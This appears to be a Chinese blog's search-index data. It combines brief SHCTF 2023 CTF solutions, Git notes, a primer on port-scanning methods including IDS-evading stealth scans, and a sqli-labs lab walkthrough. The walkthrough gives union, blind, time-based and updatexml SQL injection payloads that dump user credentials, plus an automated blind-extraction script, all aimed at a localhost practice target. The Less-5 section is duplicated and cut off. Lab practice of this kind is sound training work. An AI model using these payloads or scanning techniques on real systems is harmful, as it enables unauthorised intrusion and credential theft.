","date":"2023-11-25","objectID":"/2023shctf/:2:14","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week3尓纬玛"},{"categories":["wp"],"content":"\r[WEEK2]哈希猫逐一解密应该能解出来，，，，懒得搓了 ","date":"2023-11-25","objectID":"/2023shctf/:2:15","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2哈希猫"},{"categories":["wp"],"content":"\r[WEEK2]表里的码\r加粗填充为黑色，不加粗不填充，扫码得到flag ","date":"2023-11-25","objectID":"/2023shctf/:2:16","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2表里的码"},{"categories":["wp"],"content":"\r[WEEK2]可爱的洛琪希首先，zip未加密 然后base64解码得到jpg图片，在图片的属性信息里面的到十六进制字符串，解码得到flag 维吉尼亚解密得到flag ","date":"2023-11-25","objectID":"/2023shctf/:2:17","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2可爱的洛琪希"},{"categories":["wp"],"content":"\r[WEEK2]图片里的秘密Binwalk得到另一张图 盲水印提取 ","date":"2023-11-25","objectID":"/2023shctf/:2:18","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2图片里的秘密"},{"categories":["wp"],"content":"\r[WEEK2]喜帖街\rsteghide extract -sf music.wav -p LeeTung 随后okk解码得到flag ","date":"2023-11-25","objectID":"/2023shctf/:2:19","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2喜帖街"},{"categories":["wp"],"content":"\r[WEEK2]远在天边近在眼前\r}\\4\\a\\9\\2\\b\\0\\a\\5\\7\\c\\e\\f__\\T\\H\\G\\l\\R\\I\\a_\\y\\5\\4\\e_\\Y\\l\\l\\a\\e\\r_\\s\\I_\\S\\l\\h\\7{\\g\\a\\l\\f Windows下显示不全，可以在Linux下查看 ","date":"2023-11-25","objectID":"/2023shctf/:2:20","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2远在天边近在眼前"},{"categories":["wp"],"content":"\r[WEEK2]奇怪的screenshot根据文件描述和图片已知部分，可知为win的截图漏洞 https://github.com/frankthetank-music/Acropalypse-Multi-Tool?search=1利用工具修复得到完整图片，提取其中的文字进行百家姓解密得到flag 在线百家姓暗号转换 - 2048T在线工具站 ","date":"2023-11-25","objectID":"/2023shctf/:2:21","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week2奇怪的screenshot"},{"categories":["wp"],"content":"\rCRYPTO","date":"2023-11-25","objectID":"/2023shctf/:3:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#crypto"},{"categories":["wp"],"content":"\r[WEEK1]really_ez_rsa import gmpy2 from Crypto.Util.number import long_to_bytes p=217873395548207236847876059475581824463 q=185617189161086060278518214521453878483 c=6170206647205994850964798055359827998224330552323068751708721001188295410644 e=65537 n=p*q d= gmpy2.invert(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) ","date":"2023-11-25","objectID":"/2023shctf/:3:1","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1really_ez_rsa"},{"categories":["wp"],"content":"\r[WEEK1]凯撒大帝\r","date":"2023-11-25","objectID":"/2023shctf/:3:2","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1凯撒大帝"},{"categories":["wp"],"content":"\r[WEEK1]进制\r","date":"2023-11-25","objectID":"/2023shctf/:3:3","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1进制"},{"categories":["wp"],"content":"\r[WEEK1]okkhttps://www.splitbrain.org/services/ook ","date":"2023-11-25","objectID":"/2023shctf/:3:4","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1okk"},{"categories":["wp"],"content":"\r[WEEK1]熊斐特\r","date":"2023-11-25","objectID":"/2023shctf/:3:5","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1熊斐特"},{"categories":["wp"],"content":"\r[WEEK1]难言的遗憾https://www.qqxiuzi.cn/bianma/dianbao.php ","date":"2023-11-25","objectID":"/2023shctf/:3:6","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1难言的遗憾"},{"categories":["wp"],"content":"\r[WEEK1]小兔子可爱捏密码是42 ","date":"2023-11-25","objectID":"/2023shctf/:3:7","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1小兔子可爱捏"},{"categories":["wp"],"content":"\r[WEEK1]Crypto_Checkin\r","date":"2023-11-25","objectID":"/2023shctf/:3:8","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1crypto_checkin"},{"categories":["wp"],"content":"\r[WEEK1]what is m from Crypto.Util.number import bytes_to_long from Crypto.Util.number import inverse,long_to_bytes m = 7130439814057451252206961031070073581161360005074250134175813545291250484317873215316850120633657018292427636656594416171229024284761739178169667824242590880304270396813980988571810173170813 flag=long_to_bytes(m) flag.decode() print(flag) ","date":"2023-11-25","objectID":"/2023shctf/:3:9","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1what-is-m"},{"categories":["wp"],"content":"\r[WEEK1]立正\r但，，，最后没解出来 ","date":"2023-11-25","objectID":"/2023shctf/:3:10","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1立正"},{"categories":["wp"],"content":"\rREVERSE","date":"2023-11-25","objectID":"/2023shctf/:4:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#reverse"},{"categories":["wp"],"content":"\r[WEEK1]ez_apkJeb，base62换表 ","date":"2023-11-25","objectID":"/2023shctf/:4:1","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1ez_apk"},{"categories":["wp"],"content":"\r[WEEK1]signin\r","date":"2023-11-25","objectID":"/2023shctf/:4:2","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1signin"},{"categories":["wp"],"content":"\r[WEEK1]easy_reIda F5得到加密代码 跟进比对字符串 code = [0x66,0x0C6,0x16,0x76,0x0B7,0x45,0x27,0x97,0x0F5,0x47,0x3,0x0F5,0x37,0x3,0x0C6,0x67,0x33,0x0F5,0x47,0x86,0x56,0x0F5,0x26,0x96,0x0E6,0x16,0x27,0x97,0x0F5,0x7,0x27,0x3,0x26,0x0C6,0x33,0x0D6,0x0D7,0x1B] flag=\"\" for i in code: decrypt = ((i\u003c\u003c4)\u00260xFF)|(i\u003e\u003e4) flag += chr(decrypt) print(flag) ","date":"2023-11-25","objectID":"/2023shctf/:4:3","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1easy_re"},{"categories":["wp"],"content":"\rPWN","date":"2023-11-25","objectID":"/2023shctf/:5:0","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#pwn"},{"categories":["wp"],"content":"\r[WEEK1]hard nc\r","date":"2023-11-25","objectID":"/2023shctf/:5:1","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1hard-nc"},{"categories":["wp"],"content":"\r[WEEK1]nc\r","date":"2023-11-25","objectID":"/2023shctf/:5:2","series":null,"tags":["wp"],"title":"2023 SHCTF联赛","uri":"/2023shctf/#week1nc"},{"categories":null,"content":"2020 xinyuan\rskymirror创始人 2021 wanan\rwananwanan charmersix\rcss0k\r2022 anz\rJ1Nmu\r5H064N\rkangsir\rTaosu`Home\r开发 golong rust 2024 QingChenyou\r","date":"2023-11-18","objectID":"/links/:0:0","series":null,"tags":null,"title":"Links","uri":"/links/#"},{"categories":["notes"],"content":"一小时Git基础速成 ","date":"2023-11-18","objectID":"/git/:0:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#"},{"categories":["notes"],"content":"\r0x1版本控制在开发过长中用于管理我们对文件、目录或工程能内容的修改历史，方便查看更改历史记录，备份以便恢复以前的版本的软件工程技术。 实现跨区域多人协同开发 追踪和记载一个或多个 Git SVN CVS….. ","date":"2023-11-18","objectID":"/git/:1:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x1版本控制"},{"categories":["notes"],"content":"\r0x2版本控制分类1.本地版本控制 RCS 记录文件每次的更新，对每个版本做一个快照，适合个人使用，如RCS 2.集中式版本控制 SVN 所有的版本数据都放在服务器上，协同开发者从服务器上同步更新或上传自己的修改 3.分布式版本控制 Git 所有的版本信息都同步到本地的每个用户，本地可以查看所有版本历史，可以离线在本地提交，只需在联网时push到相应的服务器或其他用户。 ","date":"2023-11-18","objectID":"/git/:2:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x2版本控制分类"},{"categories":["notes"],"content":"\r0x3 Git启动Git Bash：Unix与Linux风格的命令行，使用最多，最推荐 Git CMD：Windows风格命令行 Git GUI：图形界面的Git，不是很建议 ","date":"2023-11-18","objectID":"/git/:3:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x3-git启动"},{"categories":["notes"],"content":"\r0x4 Git配置查看配置 git config -l 查看当前用户（global）配置 git config --global --list //用户名和密码是必须配置的 查看系统配置 git config --system --list Git相关的配置文件 (1)Git\\etc\\gitconfig Git安装目录下的gitconfig (2)c:\\User\\Administrator\\.gitconfig 只适用于当前登录用户的配置 设置用户名 git config --global user.name \"scofield\" 配置邮箱 git config --global user.email \"xxx@xxx.com\" ","date":"2023-11-18","objectID":"/git/:4:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x4-git配置"},{"categories":["notes"],"content":"\r0x5 Git基础理论","date":"2023-11-18","objectID":"/git/:5:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x5-git基础理论"},{"categories":["notes"],"content":"\r工作区域Git本地有三个工作区域，工作目录(Working Directory)、暂存区(Stage/Index)、资源库(Repository或Git Directory)。如果再加上远程的git仓库(Remote Directory)就可以分为四个工作区域。文件在这四个区域之间的转换关系如下： working：工作区，平时存放代码的地方 Index/Stage：暂存区，用于临时存放改动 Repository：仓库去（或本地仓库），安全存放数据的位置，这里有提交到所有版本的数据，其中HEAD指向最新放入仓库的版本 Remote：远程仓库，托管代码的服务器 Directory：使用Git管理的一个目录，也就是一个仓库，包含我们的工作空间和Git的管理空间 WorkSpace：需要通过Git进行版本控制的目录和文件，这些目录和文件组成了工作空间 .git：存放Git管理信息的目录，初始化仓库的时候自动创建 Index/Stage：暂存区，或者叫做待提交更新区，在提交进入repo之前，我们可以把所有的更新放在暂存区 Local Repo：本地仓库，一个存放在本地的版本库；HEAD只是当前的开发分支（branch） Stash：隐藏，是一个工作状态的保存栈，用于保存/回复WorkSpace中的临时状态 ","date":"2023-11-18","objectID":"/git/:5:1","series":null,"tags":["notes"],"title":"Git","uri":"/git/#工作区域"},{"categories":["notes"],"content":"\r工作原理1.在工作目录中添加，修改文件 2.将需要进行版本管理的文件放入暂存区域 3.将暂存区域的文件提交到git仓库 因此，git管理的文件有三种状态：已修改（modified），已暂存（staged），已提交（committed） ","date":"2023-11-18","objectID":"/git/:5:2","series":null,"tags":["notes"],"title":"Git","uri":"/git/#工作原理"},{"categories":["notes"],"content":"\r0x6 Git项目搭建创建工作目录与常用指令 工作目录（WorkSpace），建议不要有中文 本地仓库搭建 一种是创建全新仓库，另一种是克隆远程仓库 创建全新的仓库，需要使用Git管理的项目的根目录执行 git init //在当前目录新建一个Git代码库 克隆远程仓库 将远程服务器上的仓库完全镜像一份至本地 git clone [url] //克隆一个项目和它的整个代码历史(版本信息) ","date":"2023-11-18","objectID":"/git/:6:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x6-git项目搭建"},{"categories":["notes"],"content":"\r0x7 Git文件操作文件的四种状态： Untracked：未跟踪，此文件在文件夹中，但没有加入到git库，不参与版本控制，通过git add，状态变为Staged Unmodify：文件已入库，未修改，即版本库中的文件快照内容与文件夹中完全一致，这种类型的文件有两种去处，如果他被修改，而变为modified，如果使用git rm移出版本库，则成为untracked文件 Modified：文件已修改，没有进行其他操作，通过git add可进入暂存staged状态，使用git checkout则丢弃修改过的，返回unmodify的状态，即从库中取出文件，覆盖当前修改 Staged：暂存状态，执行git commit则将修改同步到库中，这时库中的文件和本地文件又变为一致，文件为Unmodify状态，执行git reset HEAD filename取消暂存，文件状态为Modified ","date":"2023-11-18","objectID":"/git/:7:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x7-git文件操作"},{"categories":["notes"],"content":"\r查看文件状态 #查看指定文件状态 git status [filename] #查看所有文件状态 git status #git add . 添加所有文件到暂存区 #git commit -m \"消息内容\" 提交暂存区中的文件内容到本地仓库 -m 提交信息 ","date":"2023-11-18","objectID":"/git/:7:1","series":null,"tags":["notes"],"title":"Git","uri":"/git/#查看文件状态"},{"categories":["notes"],"content":"\r忽略文件有时候我们不想把某些文件纳入版本控制中，比如数据库文件，临时文件等 在主目录下建立\".gitignore\"文件，此文件有如下规则： 忽略文件中的空行或以井号（#）开始的行 可以使用Linux通配符 如果名称最前面有一个感叹号（!），表示例外规则，将不被忽略 如果名称的最前面是一个路径分隔符（/），表示要忽略的文件在此目录下，而子目录中的文件不忽略 如果名称最后面是一个路径分隔符（/），表示要忽略的是此目录下该名称的子目录，而非文件 #为注释 !lib.txt #lib.txt文件除外 /temp #进忽略项目根目录下的文件，不包括其他目录temp build/ #忽略build/目录下的所有文件 ","date":"2023-11-18","objectID":"/git/:7:2","series":null,"tags":["notes"],"title":"Git","uri":"/git/#忽略文件"},{"categories":["notes"],"content":"\r注册github略 ","date":"2023-11-18","objectID":"/git/:7:3","series":null,"tags":["notes"],"title":"Git","uri":"/git/#注册github"},{"categories":["notes"],"content":"\r设置本机绑定ssh公钥实现免密登录 #进入C:\\User\\Administrator\\.ssh 目录 #生成公钥 ssh-keygen 随后将公钥信息public key添加到github即可 ","date":"2023-11-18","objectID":"/git/:7:4","series":null,"tags":["notes"],"title":"Git","uri":"/git/#设置本机绑定ssh公钥"},{"categories":["notes"],"content":"\r0x8 Git分支\rgit分支中常用命令： #列出所有本地分支 git branch #列出所有远程分支 git branch -r #新建一个分支，但依然停留在当前分支 git branch [branch_name] #新建一个分支，并切换到该分支 git checkout -b [branch] #合并指定分支到当前分支 git merge [branch] #删除分支 git branch -d [branch_name] #删除远程分支 git push origin --delete [branch_name] git branch -dr [remote/branch] ","date":"2023-11-18","objectID":"/git/:8:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x8-git分支"},{"categories":["notes"],"content":"\r0x9 git挂代理​ Git代理有两种设置方式，分别是全局代理和只对Github代理，建议只对github 代理。 代理协议也有两种，分别是使用http代理和使用socks5代理，建议使用socks5代理。 注意下面代码的端口号需要根据你自己的代理端口设定，比如我的代理socks端口是6987. 全局设置（不推荐） #使用http代理 git config --global http.proxy http://127.0.0.1:58591 git config --global https.proxy https://127.0.0.1:58591 #使用socks5代理 git config --global http.proxy socks5://127.0.0.1:51837 git config --global https.proxy socks5://127.0.0.1:51837 只设置 Github 的代理 git config --global http.https://github.com.proxy socks5://127.0.0.1:6986 git config --global https.https://github.com.proxy socks5://127.0.0.1:6986 取消代理 git config --global --unset http.proxy git config --global --unset https.proxy 参考： https://blog.csdn.net/qq_33406021/article/details/130199208 ","date":"2023-11-18","objectID":"/git/:9:0","series":null,"tags":["notes"],"title":"Git","uri":"/git/#0x9-git挂代理"},{"categories":["web"],"content":"端口扫描的各种方式的原理 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#"},{"categories":["web"],"content":"\r端口扫描概述端口扫描的目的是找出目标系统上提供的服务列表。端口扫描程序挨个尝试与 TCP/UDP端口连接，然后根据端口与服务的对应关系，结合服务器端的反应推断目标系统上是否运行了某项服务，攻击者通过这些服务可能获得关于目标系统的进一步的知识或通往目标系统的途径。根据端口扫描利用的技术，扫描可以分成多种类型，下面分别叙述。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#端口扫描概述"},{"categories":["web"],"content":"\r完全连接扫描完全连接扫描利用 TCP/IP 协议的三次握手连接机制，使源主机和目的主机的某个端口建立一次完整的连接。如果建立成功，则表明该端口开放。否则，表明该端口关闭。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#完全连接扫描"},{"categories":["web"],"content":"\r半连接扫描半连接扫描是指在源主机和目的主机的三次握手连接过程中，只完成前两次握手，不建立一次完整的连接。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#半连接扫描"},{"categories":["web"],"content":"\rSYN 扫描首先向目标主机发送连接请求，当目标主机返回响应后，立即切断连接过程，并查看响应情况。如果目标主机返回ACK信息，表示目标主机的该端口开放。如果目标主机返回RESET 信息，表示该端口没有开放。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#syn-扫描"},{"categories":["web"],"content":"\rID 头信息扫描这种扫描方法需要用一台第三方机器配合扫描，并且这台机器的网络通信量要非常少，即dumb主机。 首先由源主机A向dumb主机B发出连续的PING数据包，并且查看主机B返回的数据包的ID头信息。一般而言，每个顺序数据包的ID头的值会增加1。然后由源主机A假冒主机B 的地址向目的主机C的任意端口（1~65535）发送SYN数据包。这时，主机C向主机B发送的数据包有两种可能的结果∶ ·SYNACK 表示该端口处于监听状态。● RSTACK 表示该端口处于非监听状态。 那么，由后续PING 数据包的响应信息的ID头信息可以看出，如果主机C的某个端口是开放的，则主机B返回A的数据包中，ID头的值不是递增1，而是大于1。如果主机C的某个端口是非开放的，则主机B返回A的数据包中，ID头的值递增1，非常规律。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#id-头信息扫描"},{"categories":["web"],"content":"\r隐蔽扫描隐蔽扫描是指能够成功地绕过IDS、防火墙和监视系统等安全机制，取得目标主机端口信息的一种扫描方式。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#隐蔽扫描"},{"categories":["web"],"content":"\rSYN|ACK 扫描由源主机向目标主机的某个端口直接发送SYN|ACK 数据包，而不是先发送SYN数据包。由于这种方法不发送SYN 数据包，目标主机会认为这是一次错误的连接，从而会报错。如果目标主机的该端口没有开放，则会返回RST信息。如果目标主机的该端口处于开放 状态（LISTENING），则不会返回任何信息，而是直接将这个数据包抛弃掉。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#synack-扫描"},{"categories":["web"],"content":"\rFIN 扫描源主机A向目标主机B发送FIN 数据包，然后查看反馈信息。如果端口返回RESET信息，则说明该端口关闭。如果端口没有返回任何信息，则说明该端口开放。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#fin-扫描"},{"categories":["web"],"content":"\rACK 扫描首先由主机A向目标主机B发送FIN数据包，然后查看反馈数据包的TTL值和WIN值。开放端口所返回的数据包的TTL值一般小于64，而关闭端口的返回值一般大于64。开放端口所返回的数据包的WIN值一般大于0，而关闭端口的返回值一般等于0。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#ack-扫描"},{"categories":["web"],"content":"\rNULL扫描将源主机发送的数据包中的ACK、FIN、RST、SYN、URG、PSH等标志位全部置空。如果目标主机没有返回任何信息，则表明该端口是开放的。如果返回RST信息，则表明该端口是关闭的。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#null扫描"},{"categories":["web"],"content":"\rXMAS 扫描XMAS扫描的原理和NULL扫描相同，只是将要发送的数据包中的ACK、FIN、RST、SYN、URG、PSH等头标志位全部置成1.如果目标主机没有返回任何信息，则表明该端口是开放的。如果返回 RST信息，则表明该端口是关闭的。 网络端口扫描是攻击者必备的技术，通过扫描可以掌握攻击目标的开放服务，根据扫描所获得的信息，为下一步的攻击做准备。 ","date":"2023-11-18","objectID":"/port_scan/:0:0","series":null,"tags":["web"],"title":"端口扫描原理","uri":"/port_scan/#xmas-扫描"},{"categories":["web","wp","sqli-labs"],"content":"sqli-labs靶场精简记录1-10 ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:0","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-1 GET - Error based - Single quotes - String基于错误的GET单引号字符型注入 vul $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; bypass http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+ 爆数据库 id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+ 爆表名 id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ 爆字段名 id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ 爆数据名 id=-1'union select 1,group_concat(username,password),3 from security.users--+ id=-1'union select 1,group_concat(username,password),3 from users--+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:1","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-1-get---error-based---single-quotes---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-2GET - Error based - Intiger based基于错误的GET整型注入 vul $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\"; bypass http://127.0.0.1/sqli-labs/Less-3/?id=-1 union select 1,2,3 --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:2","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-2get---error-based---intiger-based"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-3 GET - Error based - Single quotes with twist string基于错误的GET单引号变形字符型注入 vul $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\"; bypass http://127.0.0.1/sqli-labs/Less-3/?id=-1') union select 1,2,3 --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:3","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-3-get---error-based---single-quotes-with-twist-string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-4 GET - Error based - Double Quotes - String基于错误的GET双引号字符型注入 vul $id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; bypass http://127.0.0.1/sqli-labs/Less-4/?id=-1\") union select 1,2,3 --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:4","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-4-get---error-based---double-quotes---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-5 GET - Double Injection - Single Quotes - String双注入GET单引号字符型注入 vul $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; ... print_r(mysql_error()); payload 基于报错注入 //判断数据库的长度 ?id=1'and length((select database()))\u003e9--+ //截取判断对应字符 //substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。 ?id=1'and ascii(substr((select database()),1,1))=115--+ //判断所有表名字符长度 ?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u003e13--+ //逐一判断表名 ?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u003e99--+ //判断所有字段名的长度 ?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))\u003e20--+ //逐一判断字段名 ?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))\u003e99--+ //判断字段内容长度 ?id=1' and length((select group_concat(username,password) from users))\u003e109--+ //逐一检测内容 ?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))\u003e50--+ 基于时间盲注sleep()函数 id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- # 当正确时无明显延迟,错误有明显延迟 benchmark () 函数 id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- # script # coding:utf-8 import requests import datetime import time # 获取数据库名长度 def database_len(): for i in range(1, 10): url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \" ?id=1' and if(length(database())\u003e%s,sleep(1),0) --+\" % i # print(url+payload+'%23') time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e= 1: print(i) else: print(i) break print('database_len:', i) #获取数据库名 def database_name(): name = '' for j in range(1,9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \"?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+\" % (j,i) #print(url+payload) time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e=3: name += i print(name) break print('database_name:', name) if __name__ == '__main__': database_name() xpath注入 mysql\u003e updatexml(1,concat(0x5e,database(),0x5e),1); ERROR 1105 (HY000): XPATH syntax error: '^security^' payload ?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#less-5-get---double-injection---single-quotes---string"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-5 GET - Double Injection - Single Quotes - String双注入GET单引号字符型注入 vul $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; ... print_r(mysql_error()); payload 基于报错注入 //判断数据库的长度 ?id=1'and length((select database()))\u003e9--+ //截取判断对应字符 //substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。 ?id=1'and ascii(substr((select database()),1,1))=115--+ //判断所有表名字符长度 ?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u003e13--+ //逐一判断表名 ?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u003e99--+ //判断所有字段名的长度 ?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))\u003e20--+ //逐一判断字段名 ?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))\u003e99--+ //判断字段内容长度 ?id=1' and length((select group_concat(username,password) from users))\u003e109--+ //逐一检测内容 ?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))\u003e50--+ 基于时间盲注sleep()函数 id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- # 当正确时无明显延迟,错误有明显延迟 benchmark () 函数 id=1' UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1-- # script # coding:utf-8 import requests import datetime import time # 获取数据库名长度 def database_len(): for i in range(1, 10): url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \" ?id=1' and if(length(database())\u003e%s,sleep(1),0) --+\" % i # print(url+payload+'%23') time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e= 1: print(i) else: print(i) break print('database_len:', i) #获取数据库名 def database_name(): name = '' for j in range(1,9): for i in '0123456789abcdefghijklmnopqrstuvwxyz': url = \"http://127.0.0.1/sqli-labs/Less-5/index.php\" payload = \"?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+\" % (j,i) #print(url+payload) time1 = datetime.datetime.now() r = requests.get(url + payload) time2 = datetime.datetime.now() sec = (time2 - time1).seconds if sec \u003e=3: name += i print(name) break print('database_name:', name) if __name__ == '__main__': database_name() xpath注入 mysql\u003e updatexml(1,concat(0x5e,database(),0x5e),1); ERROR 1105 (HY000): XPATH syntax error: '^security^' payload ?id=1' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+ ","date":"2023-11-17","objectID":"/sqli-labs_1_get/:0:5","series":null,"tags":["web","wp","sqli"],"title":"sqli-labs靶场(1)GET型","uri":"/sqli-labs_1_get/#基于报错注入"},{"categories":["web","wp","sqli-labs"],"content":"\rLess-5 GET - Double Injection - Single Quotes - String双注入GET单引号字符型注入 vul $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; ... print_r(mysql_error()); payload 基于报错注入 //判断数据库的长度 ?id=1'and length((select database()))\u003e9--+ //截取判断对应字符 //substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。 ?id=1'and ascii(substr((select database()),1,1))=115--+ //判断所有表名字符长度 ?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u003e13--+ //逐一判断表名 ?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u003e99--+ //判断所有字段名的长度 ?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))\u003e20--+ //逐一判断字段名 ?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and 